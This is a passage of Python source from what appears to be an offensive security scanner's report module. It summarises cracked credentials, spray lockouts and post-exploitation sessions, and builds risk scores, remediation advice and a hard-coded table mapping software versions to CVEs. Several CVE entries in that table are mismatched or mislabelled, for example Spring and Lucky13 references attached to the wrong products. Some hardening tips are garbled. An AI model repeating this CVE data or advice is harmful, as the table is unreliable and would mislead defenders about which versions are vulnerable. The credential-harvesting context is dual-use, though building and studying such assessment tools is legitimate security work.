                    'host': getattr(c, 'host', c.get('host', '')
                                    if isinstance(c, dict) else ''),
                    'port': getattr(c, 'port', c.get('port', '')
                                    if isinstance(c, dict) else ''),
                    'username': getattr(c, 'username', c.get('username', '')
                                        if isinstance(c, dict) else ''),
                    'password': getattr(c, 'password', c.get('password', '')
                                        if isinstance(c, dict) else ''),
                }
                for c in service_creds
            ],
            'admin_panels': [
                {'url': p.get('url', ''),
                 'panel_type': p.get('panel_type', 'UNKNOWN'),
                 'status': p.get('status', '')}
                for p in admin_panels if isinstance(p, dict)
            ],
            'anonymous_access': [
                {'service': a.get('service', ''), 'host': a.get('host', ''),
                 'port': a.get('port', ''), 'detail': a.get('detail', '')}
                for a in anon if isinstance(a, dict)
            ],
            'spray_lockouts': [
                {'url': l.get('url', ''), 'detail': l.get('detail', '')}
                for l in (bruteforce.get('spray_lockouts') or [])
                if isinstance(l, dict)
            ],
            'web_logins_found': len(web_logins),
        }

    def _summarize_enumeration(self, enumeration: Any) -> Dict[str, Any]:
        """Normalize service enumeration results (SMTP/POP3/IMAP/SMB/SNMP)."""
        if not enumeration or not isinstance(enumeration, dict):
            return {}
        summary: Dict[str, Any] = {}
        for service, data in enumeration.items():
            if not isinstance(data, dict):
                summary[service] = data
                continue
            summary[service] = {
                'accessible': data.get('accessible', False),
                'banner': str(data.get('banner', ''))[:300],
            }
            for key in ('os_version', 'shares', 'transport', 'community',
                        'users', 'domains', 'capabilities'):
                if data.get(key):
                    summary[service][key] = data[key]
        return summary

    def _summarize_ai(self, ai_analysis: Any) -> Dict[str, Any]:
        """Compact, advisory-only view of the AI pass for the report."""
        if not ai_analysis or not isinstance(ai_analysis, dict):
            return {}
        statements = ai_analysis.get('statements') or []
        validated = ai_analysis.get('validated_findings') or []
        hypotheses = ai_analysis.get('false_positive_hypotheses') or []
        filtered = ai_analysis.get('filtered_findings') or []
        summary = {
            'provider': ai_analysis.get('provider', ''),
            'model': ai_analysis.get('model', ''),
            'advisory_only': True,
            'statement_count': len(statements),
            'false_positive_hypotheses': len(hypotheses),
            'validated_statements': len(validated),
            'findings_suggested_as_false_positive': len(filtered),
            'consolidation': ai_analysis.get('consolidation', {}),
            'statements': statements[:50],
            'false_positive_details': filtered[:50],
        }
        if ai_analysis.get('filtered_indices'):
            summary['filtered_finding_indices'] = ai_analysis['filtered_indices'][:200]
        return summary

    def _summarize_post_assessment(self, post_assessment: Any) -> Any:
        """Normalize the structured post-exploitation assessment section."""
        if not post_assessment:
            return {}
        if not isinstance(post_assessment, dict):
            return {"raw": str(post_assessment)[:2000]}
        summary = {"engagement_id": post_assessment.get("engagement_id", ""),
                   "sessions": []}
        for session in post_assessment.get("sessions", []):
            modules = session.get("modules", {})
            summary["sessions"].append({
                "session_id": session.get("session_id", ""),
                "target": session.get("target", ""),
                "status": {
                    name: mod.get("status")
                    for name, mod in modules.items()
                },
                "findings_count": sum(
                    len(mod.get("findings", [])) for mod in modules.values()
                ),
            })
        return summary

    def _summarize_findings(self, findings: Any) -> List[Dict]:
        """Flatten the findings registry into a report-safe list."""
        if not findings:
            return []
        if isinstance(findings, dict):
            findings = findings.get("findings", [])
        result = []
        for f in findings if isinstance(findings, list) else []:
            if not isinstance(f, dict):
                continue
            result.append({
                "id": f.get("id", ""),
                "title": f.get("title", ""),
                "severity": f.get("severity", "info"),
                "state": f.get("state", "discovered"),
                "affected_asset": f.get("affected_asset", ""),
                "confidence": f.get("confidence", 0.0),
            })
        return result

    def _calculate_overall_risk(self, critical: List, high: List,
                                medium: List = None) -> str:
        """Calculate overall risk level.

        Medium findings count: a stack of MEDIUMs (missing headers,
        directory listings, ...) is a MEDIUM risk, not LOW.
        """
        if len(critical) > 0:
            return 'CRITICAL'
        elif len(high) > 3:
            return 'HIGH'
        elif len(high) > 0:
            return 'MEDIUM'
        elif medium and len(medium) > 0:
            return 'MEDIUM'
        else:
            return 'LOW'

    def _generate_executive_summary(self, critical, high, medium, exploits, no_findings: bool = False):
        """Generate high-level executive summary focused on risk and business impact."""
        impact_score = (len(critical) * 10) + (len(high) * 3) + (len(exploits) * 5)
        
        if no_findings:
            return {
                'overview': 'No exploitable vulnerabilities were identified during the automated assessment.',
                'compliance_impact': 'POSITIVE',
                'summary_description': 'The target passed the automated scan with no CRITICAL, HIGH, or MEDIUM severity findings. Review discovered assets for completeness of the assessment scope.',
                'key_actions': [
                    'Review discovered URLs, ports, and technologies to confirm scan coverage.',
                    'Verify that only authorized assets are exposed to the internet.',
                    'Schedule periodic re-assessment to account for new technologies and CVEs.'
                ]
            }

        if impact_score >= 50:
            level = 'SEVERE'
            desc = 'Immediate threat to business operations and data integrity.'
        elif impact_score >= 25:
            level = 'HIGH'
            desc = 'Significant risk requiring urgent management attention.'
        else:
            level = 'MODERATE'
            desc = 'Manageable risk profile requiring scheduled patching.'

        return {
            'overview': f'Audit identified {len(critical)} CRITICAL and {len(high)} HIGH severity findings.',
            'compliance_impact': level,
            'summary_description': desc,
            'key_actions': [
                'Isolate affected systems if CRITICAL vulnerabilities exist.',
                'Deploy WAF signatures to mitigate injection attempts.',
                'Schedule patching for all identified vulnerabilities.',
                'Conduct follow-up verification audit after remediation.'
            ]
        }

    def generate_recommendations(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """Generate security recommendations based on findings."""
        recommendations = []
        
        issue_map = {
            'SQL Injection': ('CRITICAL', 'Use parameterized queries or prepared statements. Disable detailed database error messages.'),
            'XSS': ('HIGH', 'Implement proper output encoding and Content Security Policy (CSP).'),
            'Cross-Site Scripting': ('HIGH',
                                     'Implement proper output encoding and '
                                     'Content Security Policy (CSP). Encode '
                                     'user-controlled output in HTML, '
                                     'attribute, and JavaScript contexts.'),
            'Command Injection': ('CRITICAL', 'Avoid passing user input to system shells. Use allowlists for command arguments.'),
            'File Inclusion': ('CRITICAL', 'Validate file paths against an allowlist and use filesystem root restrictions.'),
            'Authentication': ('CRITICAL', 'Implement MFA and strong password policies. Review session management.'),
            'SSRF': ('CRITICAL', 'Whitelist allowed egress domains and sanitize URL inputs.'),
            'XXE': ('CRITICAL', 'Disable external entity and DTD processing in XML parsers.'),
            'Directory Listing': ('MEDIUM',
                                  'Disable directory indexes on the web '
                                  'server (e.g. "Options -Indexes"). Remove '
                                  'or protect backup/archive files exposed '
                                  'through listings.'),
            'Missing Security Headers': ('MEDIUM',
                                         'Send X-Frame-Options (or '
                                         'frame-ancestors), '
                                         'X-Content-Type-Options: nosniff, a '
                                         'Content-Security-Policy, '
                                         'Strict-Transport-Security, and '
                                         'Referrer-Policy on every response.'),
            'Sensitive Comment': ('LOW',
                                  'Strip development comments, internal '
                                  'paths, and debug notes from production '
                                  'HTML/JS before deploying.'),
            'Open Redirect': ('MEDIUM',
                              'Validate redirect targets against an allowlist '
                              'of same-origin paths; never redirect to raw '
                              'user-supplied URLs.'),
            'HTTP Method': ('MEDIUM',
                            'Disable unneeded methods (PUT, DELETE, TRACE, '
                            'OPTIONS where unused) at the server or WAF '
                            'layer.'),
            'CORS': ('MEDIUM',
                     'Restrict Access-Control-Allow-Origin to trusted '
                     'origins; never reflect arbitrary origins with '
                     'credentials allowed.'),
            'Backup': ('HIGH',
                       'Remove backup/archive files (.old, .bak, .zip, .sql) '
                       'from web roots or deny access to them; they often '
                       'contain source and credentials.'),
            'Subdomain Takeover': ('HIGH', 'Remove dangling DNS records pointing at unclaimed external services, or reclaim the service.'),
            'Cookie': ('LOW', 'Set Secure, HttpOnly, and SameSite=Lax (or Strict) on session cookies.'),
        }
        timeline_map = {'CRITICAL': 'Immediate', 'HIGH': 'Urgent',
                        'MEDIUM': 'Scheduled', 'LOW': 'Scheduled', 'INFO': 'Scheduled'}

        added_types = set()
        for vuln in vulnerabilities or []:
            if not isinstance(vuln, dict):
                continue
            vtype = vuln.get('type', '')
            matched = False
            for key, (sev, rec) in issue_map.items():
                if key in vtype and key not in added_types:
                    recommendations.append({
                        'issue': key,
                        'severity': sev,
                        'recommendation': rec,
                        'timeline': timeline_map.get(sev, 'Scheduled')
                    })
                    added_types.add(key)
                    matched = True
            # Never fall back to a single generic line while real findings
            # exist: each unmapped type gets its own actionable entry.
            if not matched and vtype and vtype not in added_types:
                sev = str(vuln.get('severity', 'MEDIUM')).upper()
                recommendations.append({
                    'issue': vtype,
                    'severity': sev,
                    'recommendation': ('Investigate this finding against vendor '
                                       'guidance, apply the fix, and re-test to '
                                       'confirm remediation.'),
                    'timeline': timeline_map.get(sev, 'Scheduled')
                })
                added_types.add(vtype)

        if not recommendations:
            recommendations.append({
                'issue': 'General Hardening',
                'severity': 'MEDIUM',
                'recommendation': 'Implement regular security patching and monitoring.',
                'timeline': 'Scheduled'
            })
            
        return recommendations

    def generate_tech_suggestions(self, technologies: List[str], technologies_with_confidence: List[Dict] = None) -> List[Dict]:
        """Generate technology-specific hardening suggestions."""
        suggestions = []
        techs = [t.lower() for t in technologies or []]

        mapping = {
            'cloudflare': 'Verify origin shielding and authenticated origin pulls.',
            'wordpress': 'Update core/plugins and disable XML-RPC if unused.',
            'nginx': 'Disable server tokens and check for insecure vhost configurations.',
            'php': 'Disable display_errors and enable allow_url_fopen=Off in php.ini.',
            'laravel': 'Ensure APP_DEBUG is false and APP_KEY is correctly set.',
            'apache': 'Disable server tokens, directory listing, and mod_info/status if unused.',
            'iis': 'Remove unnecessary ISAPI handlers and disable WebDAV if unused.',
            'drupal': 'Keep core and modules updated; disable unreliable contributed modules.',
            'joomla': 'Remove unnecessary extensions and enable Two-Factor Authentication.',
            'magento': 'Apply latest security patches and disable developer mode in production.',
            'tomcat': 'Remove example apps and disable AJP connector if unused (Ghostcat mitigation).',
            'node.js': 'Avoid running as root; set NODE_ENV=production; use helmet.js.',
            'python': 'Use virtual environments and pin dependencies with known-good hashes.',
            'express': 'Disable x-powered-by header and implement rate limiting.',
            'asp.net': 'Set customErrors mode=On and enable request validation.',
            'spring': 'Disactuator endpoints in production unless secured; use Spring Security.',
        }

        for t in techs:
            for key, suggestion in mapping.items():
                if key in t:
                    suggestions.append({
                        'technology': t,
                        'suggestion': suggestion
                    })
        return suggestions

    _CVE_CACHE: Dict[str, List[Dict]] = {}
    _CVE_CACHE_TTL: float = 0
    _CVE_CACHE_DURATION: int = 3600  # 1 hour

    def generate_cve_lookup(self, technologies: List[str], technologies_with_confidence: List[Dict] = None) -> List[Dict]:
        """Map detected versioned technologies to known CVEs using live NVD API + curated fallback.
        
        Only technologies with confidence >= 2 are processed for CVE lookup.
        """
        if technologies_with_confidence:
            filtered = [t['technology'] for t in technologies_with_confidence if t.get('confidence', 3) >= 2]
            return self._generate_cve_lookup_sync(filtered)
        return self._generate_cve_lookup_sync(technologies)

    @staticmethod
    def _version_lte(v1: str, v2: str) -> bool:
        """Check if version v1 is <= v2 (semver-aware)."""
        try:
            p1 = [int(x) for x in v1.split('.')]
            p2 = [int(x) for x in v2.split('.')]
            for i in range(max(len(p1), len(p2))):
                a = p1[i] if i < len(p1) else 0
                b = p2[i] if i < len(p2) else 0
                if a != b:
                    return a <= b
            return True
        except (ValueError, IndexError):
            return False

    def _get_curated_cve(self, name_lower: str, version: str) -> Optional[List[str]]:
        """Return CVEs for (tech, version) from curated map + version range matching."""
        if not version:
            return None
        # Strip build metadata, pre-release tags
        version = version.split('+')[0].split('-')[0]
        known_vulns = {
            'apache': {
                '2.4.49': ['CVE-2021-41773 - Path Traversal & RCE in Apache 2.4.49'],
                '2.4.50': ['CVE-2021-42013 - RCE bypass for CVE-2021-41773'],
                '2.4.48': ['CVE-2021-44790 - mod_lua RCE in Apache <= 2.4.48'],
                '2.4.46': ['CVE-2021-40438 - SSRF in mod_proxy (affects 2.4.30-2.4.46)'],
                '2.4.43': ['CVE-2021-33193 - HTTP/2 request splitting'],
                '2.4.39': ['CVE-2019-10081 - HTTP/2 push request memory corruption'],
                '2.4.38': ['CVE-2019-0211 - Privilege escalation via shared memory'],
                '2.4.37': ['CVE-2019-0215 - mod_ssl access control bypass'],
                '2.4.35': ['CVE-2018-11763 - mod_http2 denial of service'],
                '2.4.34': ['CVE-2018-8011 - mod_md denial of service'],
                '2.4.33': ['CVE-2018-1303 - mod_cache_sm problem'],
                '2.4.29': ['CVE-2017-15710 - mod_auth_digest out-of-bounds write'],
                '2.2.32': ['CVE-2017-9798 - ap_getword() buffer overread'],
            },
            'nginx': {
                '1.25.0': ['CVE-2023-44487 - HTTP/2 rapid reset DoS'],
                '1.22.0': ['CVE-2022-41741 - Memory disclosure in ngx_http_mp4_module'],
                '1.21.0': ['CVE-2021-3618 - ALPACA TLS triple handshake attack'],
                '1.20.0': ['CVE-2021-23017 - DNS Spoofing via resolver (affects 0.6.18-1.20.0)'],
                '1.18.0': ['CVE-2020-11724 - HTTP/2 HPACK table DoS'],
                '1.16.1': ['CVE-2019-20372 - Directory traversal in error_page'],
                '1.14.0': ['CVE-2018-16845 - Memory disclosure in MP4 module'],
                '1.13.0': ['CVE-2017-7529 - Integer overflow in range filter'],
                '1.12.0': ['CVE-2017-7529 - Integer overflow in range filter'],
                '1.10.0': ['CVE-2016-4450 - NULL pointer dereference'],
                '1.4.0': ['CVE-2013-2028 - Stack buffer overflow in chunked encoding'],
            },
            'php': {
                '8.3.0': ['CVE-2023-3824 - DoS via header injection in iconv'],
                '8.2.0': ['CVE-2023-3247 - FILTER_VALIDATE_URL bypass'],
                '8.1.0': ['CVE-2021-21703 - Local privilege escalation in PHP-FPM'],
                '8.0.28': ['CVE-2023-0567 - PHAR deserialization via phar:// wrapper'],
                '8.0.0': ['CVE-2021-21703 - Local privilege escalation in PHP-FPM'],
                '7.4.33': ['CVE-2023-3247 - FILTER_VALIDATE_URL bypass'],
                '7.4.30': ['CVE-2022-31631 - SQL injection via PDO'],
                '7.4.28': ['CVE-2022-2405 - XSS in FPM status page'],
                '7.4.0': ['CVE-2019-11048 - HTTP header injection via LDAP'],
                '7.3.0': ['CVE-2018-17082 - URL heap corruption in EXIF parser'],
                '7.2.0': ['CVE-2018-10545 - Infinite loop in DBM database handler'],
                '7.1.0': ['CVE-2017-16642 - Invalid pointer in FILTER_VALIDATE_EMAIL'],
                '7.0.0': ['CVE-2016-7125 - Session module DoS via invalid session ID'],
                '5.6.30': ['CVE-2016-10397 - Memory corruption in WDDX decoder'],
                '5.6.0': ['CVE-2018-19518 - IMAP extension RCE'],
                '5.4.0': ['CVE-2013-1643 - SOAP client XXE injection'],
            },
            'wordpress': {
                '6.5.0': ['CVE-2024-2560 - Stored XSS via HTML tags in comments'],
                '6.4.0': ['CVE-2023-6896 - XSS via shortcode in post content'],
                '6.3.0': ['CVE-2023-39999 - Open redirect via wp_validate_redirect'],
                '6.2.0': ['CVE-2023-2854 - Stored XSS via block attributes'],
                '6.1.0': ['CVE-2022-3590 - Stored XSS via the Custom CSS feature'],
                '6.0.0': ['CVE-2022-29468 - Stored XSS via plugin upload'],
                '5.9.0': ['CVE-2022-21661 - SQL injection via WP_Term_Query'],
                '5.8.0': ['CVE-2021-39200 - Information disclosure via REST API'],
                '5.7.0': ['CVE-2021-29504 - Stored XSS via post meta'],
                '5.6.0': ['CVE-2021-24146 - Stored XSS via media upload'],
                '5.5.0': ['CVE-2020-28033 - Authenticated Stored XSS via post title'],
                '5.4.0': ['CVE-2020-28032 - Authenticated XSS via plugin name'],
                '5.3.0': ['CVE-2019-16787 - Stored XSS via crafted URL'],
                '5.0.0': ['CVE-2018-20148 - PHP object injection via PHAR deserialization'],
                '4.9.0': ['CVE-2017-1001000 - Path traversal in unzipping'],
                '4.8.0': ['CVE-2017-9066 - Cross-site request forgery in media library'],
                '4.7.0': ['CVE-2016-10033 - Remote code execution via PHPMailer'],
            },
            'drupal': {
                '10.0.0': ['CVE-2022-39261 - Access bypass in access policies'],
                '9.5.0': ['CVE-2023-31250 - Open redirect via drupal_goto'],
                '9.4.0': ['CVE-2022-25271 - Access bypass in workflows'],
                '9.3.0': ['CVE-2022-22947 - Open redirect in login'],
                '9.2.0': ['CVE-2021-32780 - Server-side request forgery'],
                '9.0.0': ['CVE-2020-13671 - XSS via RSS feed aggregation'],
                '8.9.0': ['CVE-2021-32677 - Third-party library XSS'],
                '8.8.0': ['CVE-2020-13664 - Arbitrary PHP code execution via file upload'],
                '8.7.0': ['CVE-2019-11279 - Stored XSS via REST module'],
                '8.6.0': ['CVE-2019-6339 - Remote code execution via Phar deserialization'],
                '7.70': ['CVE-2020-13663 - SQL injection via db_query'],
                '7.58': ['CVE-2018-7600 - Drupalgeddon RCE (SA-CORE-2018-002)'],
                '7.0.0': ['CVE-2018-7602 - Drupalgeddon2 RCE'],
            },
            'joomla': {
                '5.0.0': ['CVE-2023-40660 - XSS in media manager component'],
                '4.2.0': ['CVE-2023-23752 - Unauthenticated REST API info disclosure'],
                '4.0.0': ['CVE-2021-26033 - XSS via media manager'],
                '3.9.0': ['CVE-2020-10237 - XSS in com_users'],
                '3.8.0': ['CVE-2018-1000006 - SQL injection via com_fields'],
                '3.7.0': ['CVE-2017-8917 - SQL injection (Joomla! 3.7.0)'],
                '3.6.0': ['CVE-2016-9837 - XSS in com_messages'],
                '3.4.0': ['CVE-2015-8562 - Remote code execution via sessions'],
            },
            'magento': {
                '2.4.6': ['CVE-2023-29295 - XSS via customer data'],
                '2.4.5': ['CVE-2023-22299 - Stored XSS in admin panel'],
                '2.4.4': ['CVE-2022-35689 - RCE via cron job manipulation'],
                '2.4.0': ['CVE-2022-24060 - Stored XSS in admin panel'],
                '2.3.5': ['CVE-2021-21060 - SQL injection via customer data'],
                '2.3.0': ['CVE-2021-21059 - Authenticated RCE'],
                '2.2.0': ['CVE-2020-9682 - Unauthenticated RCE'],
                '2.1.0': ['CVE-2019-8115 - XSS in checkout'],
                '2.0.0': ['CVE-2018-6471 - Arbitrary file read via downloader'],
            },
            'laravel': {
                '10.0.0': ['CVE-2023-24209 - Mass assignment vulnerability in Eloquent'],
                '9.0.0': ['CVE-2022-31279 - SQL injection via DB::raw()'],
                '8.80': ['CVE-2022-25828 - OAuth bypass in Socialite'],
                '8.0.0': ['CVE-2021-3129 - Ignition RCE (debug mode)'],
                '7.0.0': ['CVE-2020-19347 - PDO truncation SQL injection'],
                '6.0.0': ['CVE-2020-11022 - XSS in Blade templating'],
                '5.8.0': ['CVE-2019-11051 - XSS in markdown parser'],
            },
            'tomcat': {
                '10.1.0': ['CVE-2023-41080 - DoS via HTTP/2 connection handling'],
                '10.0.0': ['CVE-2022-22965 - Spring4Shell related bypass'],
                '9.0.65': ['CVE-2022-34305 - XSS in examples webapp'],
                '9.0.60': ['CVE-2022-23181 - Time of check/time of use in JNDI realm'],
                '9.0.50': ['CVE-2022-23181 - TOCTOU in JNDI realm'],
                '9.0.40': ['CVE-2021-41079 - DoS via crafted TLS message'],
                '9.0.30': ['CVE-2021-25122 - Information disclosure via session ID'],
                '9.0.0': ['CVE-2018-8037 - Open redirection via /..;param'],
                '8.5.0': ['CVE-2020-1938 - Ghostcat: AJP file read/RCE (CVE-2020-1938)'],
                '7.0.0': ['CVE-2017-12617 - RCE via PUT method'],
            },
            'iis': {
                '10.0': ['CVE-2023-38156 - Elevation of privilege via HPACK decoder'],
                '8.5': ['CVE-2022-22025 - DoS via crafted URL requests'],
                '7.5': ['CVE-2015-1635 - MS15-034: HTTP.sys RCE via Range header'],
                '6.0': ['CVE-2010-2730 - Buffer overflow in FastCGI'],
            },
            'openssh': {
                '9.3': ['CVE-2023-38408 - RCE via forwarding of PKCS#11 tokens'],
                '8.9': ['CVE-2023-28531 - Privilege escalation via ssh-agent'],
                '8.8': ['CVE-2021-41617 - Privilege escalation via authorized_keys'],
                '8.0': ['CVE-2019-6111 - Information disclosure via SCP'],
                '7.7': ['CVE-2018-20685 - Username enumeration via scp'],
                '7.2': ['CVE-2016-6210 - Username enumeration via SSHD'],
                '7.0': ['CVE-2015-6564 - Privilege escalation via sshd PAM'],
            },
            'mysql': {
                '8.0.34': ['CVE-2023-22108 - Buffer overflow in InnoDB'],
                '8.0.30': ['CVE-2022-47047 - DoS via crafted SQL query'],
                '8.0.25': ['CVE-2022-21292 - DoS via subquery optimization'],
                '8.0.0': ['CVE-2018-2767 - DoS via optimizer'],
                '5.7.0': ['CVE-2017-3313 - Remote code execution via yaSSL'],
                '5.6.0': ['CVE-2016-6662 - RCE via crafted my.cnf'],
            },
            'postgresql': {
                '16.0': ['CVE-2023-39417 - DoS via array subscripting'],
                '15.0': ['CVE-2023-2454 - Mitigation bypass in pgcrypto'],
                '14.0': ['CVE-2022-21724 - Denial of service via btree'],
                '13.0': ['CVE-2020-25694 - Account misidentification via SSCM'],
                '12.0': ['CVE-2020-1720 - ALTER .. DEPENDS ON EXTENSION misuse'],
                '11.0': ['CVE-2018-16850 - SQL injection via CREATE TRIGGER'],
                '10.0': ['CVE-2017-15099 - Privilege escalation via INSERT ... ON CONFLICT'],
                '9.6.0': ['CVE-2016-5423 - DoS via CASE expressions'],
            },
            'openssl': {
                '3.0.0': ['CVE-2023-38153 - DoS via crafted ASN.1'],
                '1.1.1': ['CVE-2023-3446 - DoS via DH key generation'],
                '1.1.0': ['CVE-2019-1547 - ECDSA side-channel attack'],
                '1.0.2': ['CVE-2016-2107 - Padding oracle in AES-CBC (Lucky13)'],
                '1.0.1': ['CVE-2014-0160 - Heartbleed: memory disclosure via heartbeat'],
            },
            'python': {
                '3.12.0': ['CVE-2023-40217 - DoS via marshalling'],
                '3.11.0': ['CVE-2023-24329 - URL parser bypass for blocklist'],
                '3.10.0': ['CVE-2021-3737 - Infinite loop in HTTP client'],
                '3.9.0': ['CVE-2021-29921 - IPv4 address spoofing via ipaddress module'],
                '3.8.0': ['CVE-2019-9740 - CRLF injection via urllib'],
                '3.7.0': ['CVE-2018-1000802 - Directory traversal in urllib'],
                '3.6.0': ['CVE-2020-27619 - XSS via Python CGI'],
                '2.7.0': ['CVE-2019-9948 - File disclosure via urllib CRLF injection'],
            },
            'node.js': {
                '20.0.0': ['CVE-2023-30584 - Path traversal in Module._load'],
                '18.0.0': ['CVE-2022-35256 - DoS via HTTP request smuggling'],
                '16.0.0': ['CVE-2021-22931 - Improper handling of untypical characters in proxy'],
                '14.0.0': ['CVE-2020-8252 - RCE via buffer overflow in realpath'],
                '12.0.0': ['CVE-2019-15604 - DoS via HTTP/2 memory exhaustion'],
                '10.0.0': ['CVE-2018-7158 - DoS via HTTP/2 malicious frames'],
            },
            'redis': {
                '7.0.0': ['CVE-2022-35951 - Lua sandbox escape'],
                '6.2.0': ['CVE-2022-35951 - Lua sandbox escape'],
                '6.0.0': ['CVE-2020-14147 - Integer overflow in Lua scripts'],
                '5.0.0': ['CVE-2019-10193 - LUA sandbox bypass via Redis'],
                '4.0.0': ['CVE-2017-10000 - DoS via crafted INSERT'],
                '3.2.0': ['CVE-2016-8339 - Buffer overflow in cluster process'],
            },
            'mongodb': {
                '7.0.0': ['CVE-2023-22130 - DoS via crafted BSON input'],
                '6.0.0': ['CVE-2022-45169 - Stored XSS via MongoDB shell'],
                '5.0.0': ['CVE-2021-32039 - DoS via crafted queries'],
                '4.4.0': ['CVE-2020-7921 - DoS via crafted LDAP query'],
                '4.2.0': ['CVE-2019-20976 - DoS via crafted LDAP bind'],
                '3.6.0': ['CVE-2017-17427 - Memory disclosure via crafted request'],
            },
            'docker': {
                '24.0.0': ['CVE-2023-26054 - Buildkit privilege escalation via cache mounts'],
                '20.10.0': ['CVE-2021-41091 - Moby information disclosure'],
                '19.03.0': ['CVE-2020-13401 - IPv6 address spoofing via docker networks'],
                '18.09.0': ['CVE-2019-13139 - Command injection via docker build'],
                '17.12.0': ['CVE-2018-15664 - Symlink swap attack during container build'],
            },
            'kubernetes': {
                '1.28.0': ['CVE-2023-3955 - Privilege escalation via kubelet'],
                '1.27.0': ['CVE-2023-2431 - Privilege escalation via subpath'],
                '1.24.0': ['CVE-2022-3172 - Privilege escalation via Aggregated API'],
                '1.22.0': ['CVE-2021-25741 - Symlink traversal via subpath'],
                '1.20.0': ['CVE-2020-8554 - Man-in-the-middle via ExternalName services'],
            },
            'gitlab': {
                '16.0.0': ['CVE-2023-2743 - Arbitrary file read via CI artifacts'],
                '15.0.0': ['CVE-2022-1946 - XSS via RDoc documentation'],
                '14.0.0': ['CVE-2021-22205 - Unauthenticated RCE via ExifTool'],
                '13.0.0': ['CVE-2020-13258 - SSRF via CI job token'],
            },
            'jenkins': {
                '2.400': ['CVE-2023-27899 - RCE via XStream deserialization'],
                '2.300': ['CVE-2022-45387 - RCE via crafted config file'],
                '2.200': ['CVE-2021-21690 - RCE via Agent-to-Controller access control'],
                '2.100': ['CVE-2020-2099 - XSS via build log output'],
                '2.0': ['CVE-2018-1000861 - RCE via crafted URL (CVE-2018-1000861)'],
            },
            'grafana': {
                '10.0.0': ['CVE-2023-3128 - SSRF via data source proxy'],
                '9.0.0': ['CVE-2022-21707 - XSS via alerting settings'],
                '8.0.0': ['CVE-2021-28146 - SSRF via data source proxy'],
                '7.0.0': ['CVE-2020-13379 - SSRF via avatar URL processing'],
            },
            'prometheus': {
                '2.45.0': ['CVE-2023-3361 - DoS via exposition format parsing'],
                '2.40.0': ['CVE-2023-40569 - DoS via crafted text format'],
                '2.30.0': ['CVE-2022-46146 - RCE via query logging'],
                '2.20.0': ['CVE-2020-27847 - DoS via crafted query'],
            },
        }
        # Exact match first
        result = known_vulns.get(name_lower, {}).get(version)
        if result:
            return result
        # Try major.minor match (e.g., "8.0" matches "8.0.0")
        parts = version.split('.')
        if len(parts) >= 2:
            major_minor = '.'.join(parts[:2])
            result = known_vulns.get(name_lower, {}).get(major_minor)
            if result:
                return result
        return None

    def _query_nvd_api_sync(self, keyword: str) -> Optional[List[str]]:
        """Query live NVD API v2.0 for CVEs matching a keyword (synchronous)."""
        import time
        now_ts = time.time()
        if now_ts - self._CVE_CACHE_TTL < self._CVE_CACHE_DURATION and keyword in self._CVE_CACHE:
            return self._CVE_CACHE[keyword]
        url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        params = urllib.parse.urlencode({'keywordSearch': keyword, 'resultsPerPage': 5})
        full_url = f"{url}?{params}"
        try:
            resp = urllib.request.urlopen(full_url, timeout=8)
            if resp.getcode() == 200:
                data = json.loads(resp.read().decode('utf-8'))
                vulnerabilities = data.get('vulnerabilities', [])
                results = []
                for item in vulnerabilities:
                    cve = item.get('cve', {})
                    cve_id = cve.get('id', '')
                    descriptions = cve.get('descriptions', [])
                    description = ''
                    for d in descriptions:
                        if d.get('lang') == 'en':
                            description = d.get('value', '')[:120]
                            break
                    if cve_id:
                        results.append(f"{cve_id} - {description}" if description else cve_id)
                if results:
                    self._CVE_CACHE[keyword] = results
                    self._CVE_CACHE_TTL = now_ts
                    return results
        except (urllib.error.URLError, urllib.error.HTTPError, json.JSONDecodeError, OSError) as e:
            logging.getLogger(__name__).debug(f"NVD API query failed for '{keyword}': {e}")
        return None

    def _generate_cve_lookup_sync(self, technologies: List[str]) -> List[Dict]:
        results = []
        seen = set()
        for tech_str in (technologies or []):
            t = tech_str.strip()
            parts = t.rsplit(' ', 1)
            if len(parts) != 2:
                continue
            name, version = parts
            name_lower = name.lower()
            curated = self._get_curated_cve(name_lower, version)
            if curated is not None:
                cv = {'technology': t, 'known_cves': curated}
                key = f"{name_lower}:{version}"
                if key not in seen:
                    seen.add(key)
                    results.append(cv)
                continue
            api_res = self._query_nvd_api_sync(f"{name} {version}")
            if api_res:
                cv = {'technology': t, 'known_cves': api_res}
                key = f"nvd:{t}"
                if key not in seen:
                    seen.add(key)
                    results.append(cv)
            else:
                search_query = t.replace(' ', '+')
                cv = {'technology': t, 'search_url': f"https://nvd.nist.gov/search/search?query={search_query}"}
                key = f"search:{t}"
                if key not in seen:
                    seen.add(key)
                    results.append(cv)
        return results

    def generate_remediation_plan(self, vulnerabilities: List[Dict]) -> Dict:
        """Generate detailed multi-phase remediation plan."""
        critical = [v for v in vulnerabilities if v.get('severity') == 'CRITICAL']
        high = [v for v in vulnerabilities if v.get('severity') == 'HIGH']
        
        return {
            'phases': [
                {
                    'phase': 1,
                    'name': 'Emergency Remediation',
                    'vulnerabilities': len(critical),
                    'timeline': '24-48 Hours',
                    'actions': ['Patch high-impact injections', 'Reset compromised credentials']
                },
                {
                    'phase': 2,
                    'name': 'Priority Hardening',
                    'vulnerabilities': len(high),
                    'timeline': '7 Days',
                    'actions': ['Update vulnerable libraries', 'Configure security headers']
                }
            ]
        }

    def _generate_vulnerability_details(self, vulnerabilities: List[Dict]) -> Dict:
        """Generate detailed explanations, attack techniques, attacker gains, and affected asset tracking.
        
        Each vulnerability includes URL-specific exploitation steps with actual payloads.
        """
        details = {}
        generic = {
            'description': 'A security weakness was identified on the target that an attacker can leverage to compromise the application or its data.',
            'attack_techniques': [
                '1. Confirm the finding with Burp Suite by replaying the request that triggered it.',
                '2. Research the specific technology/version involved for known public exploits (search CVE databases and exploit-db).',
                '3. Chain the finding with other weaknesses (e.g., disclosure -> LFI -> RCE) to maximize impact.',
                '4. Validate impact with a controlled proof-of-concept before any destructive action.',
            ],
            'attacker_gains': 'A foothold or information advantage that an attacker chains with other findings to reach data theft or system compromise.',
            'tools': ['Burp Suite', 'nuclei', 'nmap NSE', 'Exploit-DB'],
        }

        def _kb_for(vtype: str) -> Dict[str, Any]:
            for key, canonical in ATTACK_KB_MAP:
                if key in vtype:
                    return ATTACK_KB[canonical]
            return generic

        # Remediation lookup so every type carries its fix + timeline
        _recs = {r.get('issue', ''): r for r in self.generate_recommendations(vulnerabilities)}
        def _rec_for(vtype: str, sev: str):
            for k, r in _recs.items():
                if k and k in vtype:
                    return r
            _tl = {'CRITICAL': 'Immediate', 'HIGH': 'Urgent', 'MEDIUM': 'Scheduled',
